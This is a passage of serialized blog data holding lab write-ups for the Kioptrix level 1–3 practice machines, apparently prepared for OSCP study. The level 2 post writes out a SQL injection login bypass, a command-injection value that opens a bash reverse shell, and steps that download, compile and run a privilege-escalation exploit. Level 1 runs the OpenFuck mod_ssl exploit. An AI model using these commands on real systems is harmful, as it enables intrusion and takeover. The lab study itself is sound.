quot;],[0,&quot;img/p2.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/20&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-3&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 3&quot;],&quot;date&quot;:[3,&quot;2023-03-22T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -T4 -O -p- 192.168.124.146\nnmap --script vuln -p- 192.168.124.146\ndirb http://192.168.124.146 /usr/share/wordlists/dirb/big.txt\nnikto -host 192.168.124.146\n```\n# Method-1\n## Get shell\nWe find a login page which buid with lotuscms.\n![](img/1679477677475.png)\n![](img/1679477546500.png)\nAttention,meterpreter is unavailable sometimes.We need to change payload.\n![](img/1679477759672.png)\n## Privilege escalation\nThe information of this system is as follows.\n![](img/1679477868752.png)\n\n# Enclosure\n![](img/1679457478123.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 3.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679477677475.png&quot;],[0,&quot;img/1679477546500.png&quot;],[0,&quot;img/1679477759672.png&quot;],[0,&quot;img/1679477868752.png&quot;],[0,&quot;img/1679457478123.png&quot;]]],&quot;digest&quot;:[0,&quot;551ef77a13682a84&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -T4 -O -p- 192.168.124.146&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln -p- 192.168.124.146&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.146 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto -host 192.168.124.146&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;get-shell\&quot;&gt;Get shell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#get-shell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;We find a login page which buid with lotuscms.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477677475.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477546500.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nAttention,meterpreter is unavailable sometimes.We need to change payload.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477759672.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The information of this system is as follows.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679477868752.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679457478123.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;get-shell&quot;],&quot;text&quot;:[0,&quot;Get shell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679477677475.png&quot;],[0,&quot;img/1679477546500.png&quot;],[0,&quot;img/1679477759672.png&quot;],[0,&quot;img/1679477868752.png&quot;],[0,&quot;img/1679457478123.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 3&quot;],&quot;date&quot;:[3,&quot;2023-03-22T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679477677475.png&quot;],[0,&quot;img/1679477546500.png&quot;],[0,&quot;img/1679477759672.png&quot;],[0,&quot;img/1679477868752.png&quot;],[0,&quot;img/1679457478123.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/13&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-2&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 2&quot;],&quot;date&quot;:[3,&quot;2023-03-21T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Infromation gathering\n\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -T4 -p- 192.168.124.145\nnmap --script vuln 192.168.124.145\ndirb http://192.168.124.145 /usr/share/wordlists/dirb/big.txt\nnikto -host 192.168.124.145\n```\n\n# Method-1\n## Get a shell\nThere is a sql injection vulnerability in log in page.\n```\nsqlmap -r 1.txt --level 3 --risk 3 --threads 10 --dbms mysql --current-db\n```\n![](img/1679451569042.png)\n![](img/1679452250882.png)\nOr we can use universal password to log in.\n```\n&#39; or &#39;1&#39;=&#39;1\n```\nNext,there is a commond injection.\n![](img/1679452390583.png)\n![](img/1679452397248.png)\n```\nnc -lvnp 9999                       [ //]:Run this commond on kali\n127.0.0.1&amp;bash -i &gt;&amp; /dev/tcp/192.168.124.4/9999 0&gt;&amp;1\n```\n![](img/1679453259787.png)\n## Privilege escalaion\n\n```\nsearchsploit RHEL 4\n```\n![](img/1679455848121.png)\nUse 9545.c\nExcute these commonds on kali\n```\nsearch -m 9545\n```\n```\npython3 -m http.server 9999\n```\nExcute these commonds on shell\n```\ncd /tmp\nwget http://192.168.124.4:9999/9545.c\ngcc -o 9545 9545.c\nchmod a+x 9545\n./9545\n```\n\n\n\n\n# Enclusure\n![](img/1679451049608.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 2.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679451569042.png&quot;],[0,&quot;img/1679452250882.png&quot;],[0,&quot;img/1679452390583.png&quot;],[0,&quot;img/1679452397248.png&quot;],[0,&quot;img/1679453259787.png&quot;],[0,&quot;img/1679455848121.png&quot;],[0,&quot;img/1679451049608.png&quot;]]],&quot;digest&quot;:[0,&quot;2cf00f8212204a8a&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;infromation-gathering\&quot;&gt;Infromation gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#infromation-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -sV -T4 -p- 192.168.124.145&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.145&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.145 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nikto -host 192.168.124.145&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;get-a-shell\&quot;&gt;Get a shell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#get-a-shell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;There is a sql injection vulnerability in log in page.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sqlmap -r 1.txt --level 3 --risk 3 --threads 10 --dbms mysql --current-db&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679451569042.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679452250882.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nOr we can use universal password to log in.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&#39; or &#39;1&#39;=&#39;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Next,there is a commond injection.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679452390583.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679452397248.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -lvnp 9999                       [ //]:Run this commond on kali&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;127.0.0.1&amp;#x26;bash -i &gt;&amp;#x26; /dev/tcp/192.168.124.4/9999 0&gt;&amp;#x26;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679453259787.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;privilege-escalaion\&quot;&gt;Privilege escalaion&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalaion\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit RHEL 4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679455848121.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nUse 9545.c\nExcute these commonds on kali&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;search -m 9545&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python3 -m http.server 9999&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Excute these commonds on shell&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cd /tmp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wget http://192.168.124.4:9999/9545.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -o 9545 9545.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod a+x 9545&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./9545&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;enclusure\&quot;&gt;Enclusure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclusure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679451049608.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;infromation-gathering&quot;],&quot;text&quot;:[0,&quot;Infromation gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;get-a-shell&quot;],&quot;text&quot;:[0,&quot;Get a shell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalaion&quot;],&quot;text&quot;:[0,&quot;Privilege escalaion&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclusure&quot;],&quot;text&quot;:[0,&quot;Enclusure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679451569042.png&quot;],[0,&quot;img/1679452250882.png&quot;],[0,&quot;img/1679452390583.png&quot;],[0,&quot;img/1679452397248.png&quot;],[0,&quot;img/1679453259787.png&quot;],[0,&quot;img/1679455848121.png&quot;],[0,&quot;img/1679451049608.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 2&quot;],&quot;date&quot;:[3,&quot;2023-03-21T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679451569042.png&quot;],[0,&quot;img/1679452250882.png&quot;],[0,&quot;img/1679452390583.png&quot;],[0,&quot;img/1679452397248.png&quot;],[0,&quot;img/1679453259787.png&quot;],[0,&quot;img/1679455848121.png&quot;],[0,&quot;img/1679451049608.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/12&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-1&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -T4 -sV -O 192.168.124.140 -p-\nnmap --script vuln 192.168.124.140 -p-\ndirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt\n```\n# Method-1  Samba\n![](img/1679306030928.png)\nAttentions please,meterpreter is not availiable\nIt&#39;s root.There is no need to escalate privilege.\n\n# Method-2 OpenFuck mod_ssl vulnerability\n```\nsearchsploit mod_ssl 2.8.4\n```\n![](img/1679366939593.png)\n```\nsearchsploit -p 47080\n```\n\n![](img/1679366949376.png)\n\n![](img/1679366954478.png)\nWe need install libssl-dev first.\n```\ngcc -o OpenFuck 47080.c -lcrypto\n./OpenFuck\n./OpenFuck 0x6b 192.168.124.140 443 -c 40\n```\nThere are some errors in compile process.\n\n# Enclosure\n![](img/1678960944499.png)\n\n![](img/1678960950947.png)\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners: \n|   cpe:/a:openbsd:openssh:2.9p2: \n|       CVE-2002-0640   10.0    https://vulners.com/cve/CVE-2002-0640\n|       CVE-2002-0639   10.0    https://vulners.com/cve/CVE-2002-0639\n|       CVE-2002-0083   10.0    https://vulners.com/cve/CVE-2002-0083\n|       CVE-2011-2895   9.3     https://vulners.com/cve/CVE-2011-2895\n|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051\n|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924\n|       CVE-2003-1562   7.6     https://vulners.com/cve/CVE-2003-1562\n|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478\n|       CVE-2002-0575   7.5     https://vulners.com/cve/CVE-2002-0575\n|       CVE-2001-1459   7.5     https://vulners.com/cve/CVE-2001-1459\n|       CVE-2001-1380   7.5     https://vulners.com/cve/CVE-2001-1380\n|       CVE-2001-0816   7.5     https://vulners.com/cve/CVE-2001-0816\n|       SECURITYVULNS:VULN:1956 7.2     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\n|       CVE-2001-0529   7.2     https://vulners.com/cve/CVE-2001-0529\n|       SSV:64479       5.0     https://vulners.com/seebug/SSV:64479    *EXPLOIT*\n|       SSV:6192        5.0     https://vulners.com/seebug/SSV:6192     *EXPLOIT*\n|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*\n|       SSV:16847       5.0     https://vulners.com/seebug/SSV:16847    *EXPLOIT*\n|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       *EXPLOIT*\n|       PACKETSTORM:54435       5.0     https://vulners.com/packetstorm/PACKETSTORM:54435       *EXPLOIT*\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    *EXPLOIT*\n|       EDB-ID:3303     5.0     https://vulners.com/exploitdb/EDB-ID:3303       *EXPLOIT*\n|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107\n|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243\n|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052\n|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    *EXPLOIT*\n|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    *EXPLOIT*\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    *EXPLOIT*\n|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       *EXPLOIT*\n|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537\n|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814\n|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327\n|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259\n|       SECURITYVULNS:VULN:1953 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\n|       SECURITYVULNS:VULN:1608 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\n|       SECURITYVULNS:VULN:1499 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\n|       